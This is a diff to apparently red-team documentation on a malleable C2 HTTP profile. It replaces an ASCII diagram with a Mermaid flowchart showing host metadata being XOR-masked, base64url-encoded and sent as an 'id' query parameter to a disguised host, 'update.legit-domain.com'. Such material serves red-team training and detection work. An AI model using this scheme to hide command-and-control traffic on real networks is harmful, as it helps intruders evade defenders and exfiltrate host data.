@@ -54,27 +54,18 @@ http-get {
 
 ## ASCII Architecture Diagram: HTTP Transformation Flow
 
-```text
-+---------------------------------------------------------------------------------+
-|                        DATA TRANSFORMATION PIPELINE (CLIENT)                    |
-+---------------------------------------------------------------------------------+
-|                                                                                 |
-|  [Raw Metadata] :  "Computer=DC01;User=SYSTEM;PID=442"                          |
-|                                                                                 |
-|        | 1. mask (XOR Encrypt)                                                  |
-|        v                                                                        |
-|  [Masked Data]  :  "\x4A\x82\x99\x12\xFA..."                                    |
-|                                                                                 |
-|        | 2. base64url                                                           |
-|        v                                                                        |
-|  [B64 String]   :  "SoKZgvxH2..."                                               |
-|                                                                                 |
-|        | 3. parameter "id"                                                      |
-|        v                                                                        |
-|  [HTTP Request] :  GET /api/v1/update?id=SoKZgvxH2... HTTP/1.1                  |
-|                    Host: update.legit-domain.com                                |
-|                                                                                 |
-+---------------------------------------------------------------------------------+
+```mermaid
+flowchart TD
+    subgraph Pipe["DATA TRANSFORMATION PIPELINE (CLIENT)"]
+        R["Raw Metadata : Computer=DC01;User=SYSTEM;PID=442"]
+        M["Masked Data : \x4A\x82\x99\x12\xFA..."]
+        B["B64 String : SoKZgvxH2..."]
+        H["HTTP Request : GET /api/v1/update?id=SoKZgvxH2... HTTP/1.1<br>Host: update.legit-domain.com"]
+        
+        R -- "1. mask (XOR Encrypt)" --> M
+        M -- "2. base64url" --> B
+        B -- "3. parameter 'id'" --> H
+    end
 ```
 
 ---
